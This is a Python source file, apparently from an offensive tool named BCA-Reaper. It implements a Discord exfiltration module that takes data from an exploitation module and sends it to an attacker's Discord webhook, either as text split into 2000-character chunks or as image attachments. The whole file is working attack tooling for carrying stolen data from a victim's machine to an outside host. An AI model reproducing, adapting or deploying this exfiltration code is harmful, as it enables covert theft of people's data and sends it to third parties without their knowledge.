#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Reaper

__author__ = "EONRaider @ keybase.io/eonraider"

import asyncio
from io import BufferedReader
from typing import Iterator

import aiohttp
from discord import File, Webhook, AsyncWebhookAdapter

from src.modules import ExfiltrationModule


class Discord(ExfiltrationModule):
    def __init__(self, *, module, webhook_url: str):
        """Exfiltrate data to a Discord server through a Webhook URL.

        :param module: Instance of ExploitationModule from which the
            exfiltrator receives data by attaching itself to as a
            subscriber.
        :param webhook_url: URL to the Webhook set up on the Discord
            server's configuration.
        """
        super().__init__(module)
        self.webhook_url = webhook_url
        self._username = self.module.__class__.__name__

    def update(self, message: [str, None]) -> None:
        """Send each report as a new message to a Discord server with a
        Webhook URL enabled."""
        if message is not None:
            asyncio.run(self._send_message(message))

    @staticmethod
    def _slice_message(message: str,
                       char_limit: int = 2000) -> Iterator[str]:
        """Yield an iterator of sliced strings derived from a single
        string.

        Each string yielded corresponds to a sequence of characters with
        length smaller than or equal to the character limit imposed by
        the Discord service.
        Ex: A message with 3310 characters will yield two strings, one
        with 2000 and another with 1310 characters.

        :param message: A string defining the message to be split.
        :param char_limit: Number of characters to be sent per message
            to the Discord server. Set by the service itself and
            defaults to 2000 characters.
        """
        if not isinstance(message, str):
            raise TypeError
        for index in range(0, len(message), char_limit):
            yield message[index: index + char_limit]

    async def _send_message(self, message: [str, BufferedReader]) -> None:
        """Send exfiltrated text or image data to a Discord Server."""
        async with aiohttp.ClientSession() as session:
            webhook = Webhook.from_url(url=self.webhook_url,
                                       adapter=AsyncWebhookAdapter(session))
            try:  # Send message as text
                for part in self._slice_message(message):
                    await webhook.send(content=part, username=self._username)
            except TypeError:  # Send message as image attachment
                await webhook.send(file=File(fp=message),
                                   username=self._username)
